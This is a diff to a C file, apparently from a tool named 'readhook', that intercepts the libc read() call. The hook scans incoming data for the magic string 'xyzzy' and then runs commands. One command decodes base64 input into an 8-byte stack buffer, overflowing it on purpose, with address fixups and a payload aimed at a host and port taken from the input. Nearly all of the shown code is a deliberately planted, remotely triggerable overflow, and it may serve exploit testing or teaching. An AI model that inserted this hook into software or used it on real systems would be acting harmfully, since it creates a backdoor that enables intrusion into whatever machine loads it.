@@ -8,14 +8,15 @@
 #include "addresses.h"
 #include "base64.h"
 #include "payload.h"
+#include "strnstr.h"
 
 static const char s_magic[]	= "xyzzy";
 static const char s_makeload[]	= "MAKELOAD";
 static const char s_dumpload[]	= "DUMPLOAD";
-static const char s_testload[]	= "TESTLOAD";
+static const char s_overload[]	= "OVERLOAD";
 static const char s_overflow[]	= "OVERFLOW";
 
-// Parse the stuff following MAKELOAD into s_host:port
+// Parse (optional) [ <a.b.c.d> | <hostname> ] <:port>
 static ssize_t parseHostAndPort(char *p, struct in_addr *ipAddress, unsigned short *port) {
 	char s_host[256];
 	unsigned short nport;
@@ -34,6 +35,7 @@ static ssize_t parseHostAndPort(char *p, struct in_addr *ipAddress, unsigned sho
 	return nc;
 } // parseHostAndPort()
 
+// In-place substitution of request with result. So wrong... 
 static ssize_t falseEcho(PayloadPtr plp, char *p, ssize_t np) {
 	// Parse the IP Address and port into our payload
 	int nc = parseHostAndPort(p, &plp->pl_scu.sc.ipAddress, &plp->pl_scu.sc.port);
@@ -58,22 +60,34 @@ static ssize_t falseEcho(PayloadPtr plp, char *p, ssize_t np) {
 	return delta;
 } // falseEcho()
 
+// IDENTICAL to overflow(), but with two dumpload() calls for debugging.
+static void overload(Pointer p, size_t n, BaseAddressesPtr baseAddressesPtr) {
+	char buffer[8] = {0};
+
+	dumpload(p, baseAddressesPtr);
+	baseAddressesPtr->buf_base = &buffer;
+	dofixups(p, n, baseAddressesPtr);
+	dumpload(p, baseAddressesPtr);
+	memcpy(buffer, p, n);
+} // overload()
+
+// This is the overflow that readhook is all about.
 static void overflow(Pointer p, size_t n, BaseAddressesPtr baseAddressesPtr) {
 	char buffer[8] = {0};
 
-	baseAddressesPtr->buf_base = &buffer;;
+	baseAddressesPtr->buf_base = &buffer;
 	dofixups(p, n, baseAddressesPtr);
-
 	memcpy(buffer, p, n);
 } // overflow()
 
+// Interloper read function that watches for the magic string.
 typedef
 ssize_t Read(int fd, void *buf, size_t count);
 ssize_t read(int fd, void *buf, size_t count) {
 	Read *libc_read = (Read *) dlsym(RTLD_NEXT, "read");
 	ssize_t result = libc_read(fd, buf, count);
 
-	char *p = (result < strlen(s_magic)) ? NULL : strstr(buf, s_magic);
+	char *p = (result < strlen(s_magic)) ? NULL : strnstr(buf, s_magic, result);
 
 	if (p) {
 		p += strlen(s_magic);
@@ -100,8 +114,8 @@ ssize_t read(int fd, void *buf, size_t count) {
 		} // if
 		else if (!strncmp(s_dumpload, p, strlen(s_dumpload)))
 			dumpload(&payload, &baseAddresses);
-		else if (!strncmp(s_testload, p, strlen(s_testload)))
-			overflow(&payload, sizeof(payload), &baseAddresses);
+		else if (!strncmp(s_overload, p, strlen(s_overload)))
+			overload(&payload, sizeof(payload), &baseAddresses);
 		else if (!strncmp(s_overflow, p, strlen(s_overflow))) {
 			unsigned char *s64 = (unsigned char *) (p + strlen(s_overflow));
 			size_t n256 = b64Decode(s64, b64Length(s64), (unsigned char *) p, 65535);
@@ -122,9 +136,10 @@ int main(int argc, char **argv)
 
 	Payload payload;
 	initload(&payload);
-
 	makeload(&payload, &baseAddresses);
-	dumpload(&payload, &baseAddresses);
-	overflow((Pointer)&payload, sizeof(payload), &baseAddresses);
+	if (argc > 1)
+		parseHostAndPort(argv[1], &payload.pl_scu.sc.ipAddress, &payload.pl_scu.sc.port);
+
+	overload(&payload, sizeof(payload), &baseAddresses);
 } // main()
 #endif
